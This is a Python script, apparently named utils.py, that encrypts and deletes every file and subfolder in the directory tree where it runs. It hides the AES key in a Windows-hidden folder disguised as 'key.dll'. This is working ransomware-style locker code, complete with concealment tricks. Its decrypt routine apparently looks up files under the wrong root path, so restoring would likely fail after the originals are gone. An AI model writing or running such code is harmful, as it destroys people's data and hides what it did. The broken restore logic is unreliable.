import os
import json
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import ctypes  

def create_hidden_folder(folder_path):
    """
    Creates a hidden folder at the specified path.
    """
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Hidden folder created at: {folder_path}")
        # Set the folder as hidden (Windows-specific)
        result = ctypes.windll.kernel32.SetFileAttributesW(folder_path, 0x02)
        if result == 0:
            print(f"Failed to set hidden attribute for: {folder_path}")
        else:
            print(f"Hidden attribute set for: {folder_path}")

def save_key_to_dll(hidden_folder, key):
    """
    Saves the AES key to a .dll file in the hidden folder.
    """
    dll_file = os.path.join(hidden_folder, "key.dll")
    print(f"Saving AES key to: {dll_file}")  # Debugging output
    with open(dll_file, "wb") as f:
        f.write(key)
        f.flush()  # Ensure the file is written immediately
        f.close()  # Close the file handle
    print(f"AES key saved successfully to: {dll_file}")  # Debugging output


def load_key_from_dll(hidden_folder):
    """
    Loads the AES key from the .dll file in the hidden folder.
    """
    dll_file = os.path.join(hidden_folder, "key.dll")
    print(f"Loading AES key from: {dll_file}")  # Debugging output
    with open(dll_file, "rb") as f:
        return f.read()



def get_file_tree():
    """
    Retrieves the entire tree of files and folders starting from the directory
    where the executable is located, excluding the executable itself.
    
    Returns:
        tuple: A nested dictionary representing the file tree structure and the root directory path.
    """
    exe_path = os.path.abspath(__file__)
    exe_dir = os.path.dirname(exe_path)
    exe_name = os.path.basename(exe_path)
    hidden_folder_name = ".hidden_folder"
    def build_tree(directory):
        tree = {}
        for entry in os.listdir(directory):
            if entry == exe_name or entry == hidden_folder_name:
                continue
            entry_path = os.path.join(directory, entry)
            if os.path.isdir(entry_path):
                tree[entry] = build_tree(entry_path)
            else:
                tree[entry] = None
        return tree
    
    return build_tree(exe_dir), exe_dir

def encrypt_and_store(tree, root_dir, output_file, key):
    """
    Encrypts all files in the directory tree and stores the encrypted content
    along with the directory structure in a single file.
    
    Args:
        tree (dict): The directory structure.
        root_dir (str): The root directory path.
        output_file (str): The file to store encrypted content and structure.
        key (bytes): The AES encryption key.
    """
    cipher = AES.new(key, AES.MODE_CBC)
    encrypted_data = {"structure": tree, "files": {}, "iv": cipher.iv.hex()}
    
    def encrypt_files(tree, current_dir):
        for name, subtree in tree.items():
            path = os.path.join(current_dir, name)
            abs_path = os.path.abspath(path)  # Use absolute paths
            if subtree is None:  # It's a file
                with open(abs_path, "rb") as f:
                    plaintext = f.read()
                ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
                encrypted_data["files"][abs_path] = ciphertext.hex()
                os.remove(abs_path)  # Delete the original file
            else:  # It's a directory
                encrypt_files(subtree, abs_path)
                os.rmdir(abs_path)  # Delete the subdirectory after processing
    
    encrypt_files(tree, root_dir)
    
    # Save the encrypted data and structure to a file
    with open(output_file, "w") as f:
        json.dump(encrypted_data, f)

def decrypt_and_restore(input_file, output_dir, key):
    """
    Decrypts the encrypted content and restores the original files and folders.
    
    Args:
        input_file (str): The file containing encrypted content and structure.
        output_dir (str): The directory to restore the files and folders.
        key (bytes): The AES decryption key.
    """
    with open(input_file, "r") as f:
        encrypted_data = json.load(f)
    
    cipher = AES.new(key, AES.MODE_CBC, bytes.fromhex(encrypted_data["iv"]))
    
    def restore_files(tree, current_dir, original_root):
        os.makedirs(current_dir, exist_ok=True)
        for name, subtree in tree.items():
            path = os.path.join(current_dir, name)
            original_path = os.path.abspath(os.path.join(original_root, name))  # Use absolute paths
            if subtree is None:  # It's a file
                ciphertext = bytes.fromhex(encrypted_data["files"][original_path])
                plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
                with open(path, "wb") as f:
                    f.write(plaintext)
            else:  # It's a directory
                restore_files(subtree, path, original_path)
    
    # Start restoring files from the root
    restore_files(encrypted_data["structure"], output_dir, os.path.dirname(input_file))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python utils.py <encrypt|decrypt>")
        sys.exit(1)
    
    mode = sys.argv[1].lower()
    hidden_folder = os.path.join(os.path.dirname(__file__), ".hidden_folder")

    if mode == "encrypt":
        # Generate a random AES key
        aes_key = get_random_bytes(16)
        print(f"Generated AES key: {aes_key.hex()}")
        

        # Get the file tree and root directory
        file_tree, root_directory = get_file_tree()
        
        create_hidden_folder(hidden_folder)
        save_key_to_dll(hidden_folder, aes_key)
        
        # Encrypt and store the files
        output_file = os.path.join(hidden_folder, "encrypted_data.json")
        encrypt_and_store(file_tree, root_directory, output_file, aes_key)
        
        print(f"AES key has been saved in a hidden folder: {hidden_folder}")
        
        print(f"All files and folders have been encrypted and stored in {output_file}.")
        print(f"Save this AES key to decrypt later: {aes_key.hex()}")
    
    elif mode == "decrypt":
        # Load the AES key from the hidden folder
        aes_key = load_key_from_dll(hidden_folder)
        print(f"AES key loaded from hidden folder: {aes_key.hex()}")
        
        # Load the encrypted data file from the hidden folder
        encrypted_file = os.path.join(hidden_folder, "encrypted_data.json")
        if not os.path.exists(encrypted_file):
            print(f"Error: Encrypted data file not found in hidden folder: {encrypted_file}")
            sys.exit(1)
        
        # Specify the restore directory
        restore_directory = os.path.join(os.path.dirname(__file__), "restored")
        
        # Decrypt and restore the files
        decrypt_and_restore(encrypted_file, restore_directory, aes_key)
        print(f"All files and folders have been restored to {restore_directory}.")
    
    else:
        print("Invalid mode. Use 'encrypt' or 'decrypt'.")
        sys.exit(1)